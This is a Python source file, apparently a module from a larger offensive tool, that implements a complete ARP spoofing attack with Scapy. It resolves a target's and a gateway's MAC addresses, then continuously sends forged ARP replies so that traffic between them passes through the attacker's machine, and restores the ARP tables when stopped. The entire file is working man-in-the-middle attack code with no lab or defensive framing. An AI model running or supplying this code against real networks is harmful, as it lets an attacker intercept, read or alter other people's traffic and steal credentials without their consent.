#!/usr/bin/env python3
"""
ARP Spoofing Module
Uses Scapy to perform ARP spoofing attacks
"""

import threading
import time
import socket
from utils.logger import setup_logger

class ARPSpoofer:
    def __init__(self, target_ip, gateway_ip, interface='en0'):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.logger = setup_logger('arp_spoof', level='INFO')
        
        self.running = False
        self.spoof_thread = None
        
        # Import Scapy
        try:
            from scapy.all import ARP, Ether, srp, send
            self.scapy_arp = ARP
            self.scapy_ether = Ether
            self.scapy_srp = srp
            self.scapy_send = send
        except ImportError:
            raise ImportError("Scapy not installed. Run: pip install scapy")
            
    def start(self):
        """Start ARP spoofing attack"""
        self.logger.info("📡 Starting ARP spoofing attack...")
        self.logger.info(f"🎯 Target: {self.target_ip}")
        self.logger.info(f"🌐 Gateway: {self.gateway_ip}")
        
        try:
            # Get MAC addresses
            target_mac = self._get_mac_address(self.target_ip)
            gateway_mac = self._get_mac_address(self.gateway_ip)
            
            if not target_mac or not gateway_mac:
                raise Exception("Could not resolve MAC addresses")
                
            self.logger.info(f"📱 Target MAC: {target_mac}")
            self.logger.info(f"🌐 Gateway MAC: {gateway_mac}")
            
            # Start spoofing thread
            self.running = True
            self.spoof_thread = threading.Thread(
                target=self._spoof_worker,
                args=(target_mac, gateway_mac)
            )
            self.spoof_thread.daemon = True
            self.spoof_thread.start()
            
            self.logger.info("✅ ARP spoofing started successfully")
            
        except Exception as e:
            self.logger.error(f"❌ Failed to start ARP spoofing: {e}")
            raise
            
    def stop(self):
        """Stop ARP spoofing attack"""
        self.logger.info("🛑 Stopping ARP spoofing...")
        
        self.running = False
        
        if self.spoof_thread and self.spoof_thread.is_alive():
            self.spoof_thread.join(timeout=5)
            
        # Restore ARP tables
        self._restore_arp_tables()
        
        self.logger.info("✅ ARP spoofing stopped")
        
    def _get_mac_address(self, ip):
        """Get MAC address for an IP using ARP"""
        try:
            # Create ARP request packet
            arp_request = self.scapy_arp(pdst=ip)
            broadcast = self.scapy_ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            
            # Send ARP request and wait for response
            answered_list = self.scapy_srp(arp_request_broadcast, timeout=3, verbose=False)[0]
            
            if answered_list:
                return answered_list[0][1].hwsrc
            else:
                self.logger.warning(f"⚠️ Could not get MAC for {ip}")
                return None
                
        except Exception as e:
            self.logger.error(f"❌ Error getting MAC for {ip}: {e}")
            return None
            
    def _spoof_worker(self, target_mac, gateway_mac):
        """ARP spoofing worker thread"""
        self.logger.info("🔄 ARP spoofing worker started")
        
        try:
            while self.running:
                # Spoof target: tell target that gateway IP is at our MAC
                spoof_target = self.scapy_arp(
                    op=2,  # ARP reply
                    pdst=self.target_ip,
                    hwdst=target_mac,
                    psrc=self.gateway_ip,
                    hwsrc=self._get_our_mac()
                )
                
                # Spoof gateway: tell gateway that target IP is at our MAC
                spoof_gateway = self.scapy_arp(
                    op=2,  # ARP reply
                    pdst=self.gateway_ip,
                    hwdst=gateway_mac,
                    psrc=self.target_ip,
                    hwsrc=self._get_our_mac()
                )
                
                # Send spoofed packets
                self.scapy_send(spoof_target, verbose=False)
                self.scapy_send(spoof_gateway, verbose=False)
                
                # Wait before next spoof
                time.sleep(2)
                
        except Exception as e:
            if self.running:
                self.logger.error(f"❌ ARP spoofing error: {e}")
        finally:
            self.logger.info("🔄 ARP spoofing worker stopped")
            
    def _get_our_mac(self):
        """Get our own MAC address"""
        try:
            # Get interface MAC address
            if self.interface:
                # Try to get MAC from interface
                try:
                    from scapy.all import get_if_hwaddr
                    return get_if_hwaddr(self.interface)
                except:
                    pass
                    
            # Fallback: get MAC from default interface
            try:
                from scapy.all import get_if_hwaddr
                return get_if_hwaddr(self._get_default_interface())
            except:
                pass
                
            # Last resort: use a dummy MAC
            self.logger.warning("⚠️ Could not get our MAC address, using dummy")
            return "00:00:00:00:00:00"
            
        except Exception as e:
            self.logger.error(f"❌ Error getting our MAC: {e}")
            return "00:00:00:00:00:00"
            
    def _get_default_interface(self):
        """Get default network interface"""
        try:
            # Get default gateway interface
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            # Try to find interface for this IP
            if self.interface:
                return self.interface
            else:
                return "eth0"  # Fallback
                
        except Exception:
            return "eth0"  # Fallback
            
    def _restore_arp_tables(self):
        """Restore ARP tables to original state"""
        try:
            self.logger.info("🔄 Restoring ARP tables...")
            
            # Get MAC addresses
            target_mac = self._get_mac_address(self.target_ip)
            gateway_mac = self._get_mac_address(self.gateway_ip)
            
            if target_mac and gateway_mac:
                # Restore target ARP table
                restore_target = self.scapy_arp(
                    op=2,  # ARP reply
                    pdst=self.target_ip,
                    hwdst=target_mac,
                    psrc=self.gateway_ip,
                    hwsrc=gateway_mac
                )
                
                # Restore gateway ARP table
                restore_gateway = self.scapy_arp(
                    op=2,  # ARP reply
                    pdst=self.gateway_ip,
                    hwdst=gateway_mac,
                    psrc=self.target_ip,
                    hwsrc=target_mac
                )
                
                # Send restore packets
                for _ in range(4):  # Send multiple times to ensure restoration
                    self.scapy_send(restore_target, verbose=False)
                    self.scapy_send(restore_gateway, verbose=False)
                    time.sleep(1)
                    
                self.logger.info("✅ ARP tables restored")
            else:
                self.logger.warning("⚠️ Could not restore ARP tables (MAC addresses not found)")
                
        except Exception as e:
            self.logger.error(f"❌ Error restoring ARP tables: {e}")
            
    def get_stats(self):
        """Get ARP spoofing statistics"""
        return {
            'target_ip': self.target_ip,
            'gateway_ip': self.gateway_ip,
            'interface': self.interface,
            'running': self.running,
            'thread_alive': self.spoof_thread.is_alive() if self.spoof_thread else False
        }
